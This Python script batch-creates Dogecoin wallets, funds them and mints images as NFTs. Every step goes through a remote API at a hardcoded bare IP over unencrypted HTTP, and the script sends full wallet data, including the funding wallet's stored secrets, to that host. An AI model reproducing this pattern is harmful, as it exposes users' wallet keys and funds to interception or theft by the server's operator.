import os
import requests
import json
import random
import threading
import time
from dotenv import load_dotenv
import base64

load_dotenv()

WALLET_DATA_JSON = os.getenv("WALLET_DATA_JSON")
WALLETS_FOLDER_PATH = 'wallets'
IMAGES_FOLDER_PATH = 'images'


def mint_nft(file_path, wallet_data):
    with open(file_path, "rb") as image_file:
        encoded_string = base64.b64encode(image_file.read())

        url = "http://49.206.31.38:8000/api/mint_nft/"
        payload = json.dumps({
            "wallet_data": str(wallet_data),
            "file_name": f"{int(random.random() * 10 ** 10)}",
            "base64": encoded_string.decode()
        })
        headers = {
            'Content-Type': 'application/json'
        }
        response = requests.request("POST", url, headers=headers, data=payload)
        json_data = response.json()
        if json_data["status"] == 1:
            tx_id = json_data["message"].split('txid: ')[1]
            return tx_id
        else:
            return None


def create_wallet(count):
    url = "http://49.206.31.38:8000/api/create_user_wallet/"
    payload = json.dumps({
        "count": 1
    })
    headers = {
        'Content-Type': 'application/json'
    }

    i = 0
    while i < count:
        def temp_func():
            response = requests.request("POST", url, headers=headers, data=payload)

            # Parse the message and extract the JSON object
            parsed_message = json.loads(response.text)
            wallet_data = json.loads(parsed_message['message'])

            with open(f'{WALLETS_FOLDER_PATH}/wallet_{int(random.random() * 10 ** 10)}.json', 'w') as f:
                json.dump(wallet_data, f, indent=4)

        t = threading.Thread(target=temp_func)
        t.start()
        t.join()
        i += 1
        time.sleep(0.4)
    return 1


def query_bal(wallet_data):
    url = "http://49.206.31.38:8000/api/query_bal/"
    payload = json.dumps({
        "wallet_data": wallet_data
    })
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.request("POST", url, headers=headers, data=payload)
    json_data = response.json()
    if json_data["status"] == 1:
        balance = json_data["message"].split('balance ')[1]
        return balance


def send_funds(doge_address, quantity):
    url = "http://49.206.31.38:8000/api/send_funds/"
    payload = json.dumps({
        "wallet_data": str(WALLET_DATA_JSON),
        "quantity": quantity,
        "receiver_address": doge_address
    })
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.request("POST", url, headers=headers, data=payload)
    return response.text


def main():
    len_wallets = len(os.listdir(WALLETS_FOLDER_PATH))
    if len_wallets:
        delete_folder = input("Delete wallet y/n?:")
        if delete_folder.lower() == 'y':
            for filename in os.listdir(WALLETS_FOLDER_PATH):
                file_path = os.path.join(WALLETS_FOLDER_PATH, filename)
                try:
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                except Exception as e:
                    print(f"Error deleting file: {file_path} - {e}")
    create_n_wallets = len(os.listdir(IMAGES_FOLDER_PATH))
    input(f"Minting {create_n_wallets} NFTS? ")
    print(f'Creating {create_n_wallets} wallets...')
    create_wallet(create_n_wallets)

    n_funding_doge = int(input("How much doge are you funding each wallet?: "))
    wallet_files = sorted(os.listdir(WALLETS_FOLDER_PATH))
    image_files = sorted(os.listdir(IMAGES_FOLDER_PATH))

    for wallet_file, image_file in zip(wallet_files, image_files):
        with open(f"{WALLETS_FOLDER_PATH}/{wallet_file}") as file:
            wallet_data = json.load(file)
            address = wallet_data["address"]

        image_path = os.path.join(IMAGES_FOLDER_PATH, image_file)

        print(f'Funding {address} with {n_funding_doge} DOGE')
        send_funds(address, n_funding_doge)
        while True:
            bal = int(query_bal(str(wallet_data)))
            if bal != 0:
                print(f"Received funds: {bal / 10 ** 8}")
                break

        inscribe = mint_nft(image_path, wallet_data)
        print(inscribe)


if __name__ == '__main__':
    main()
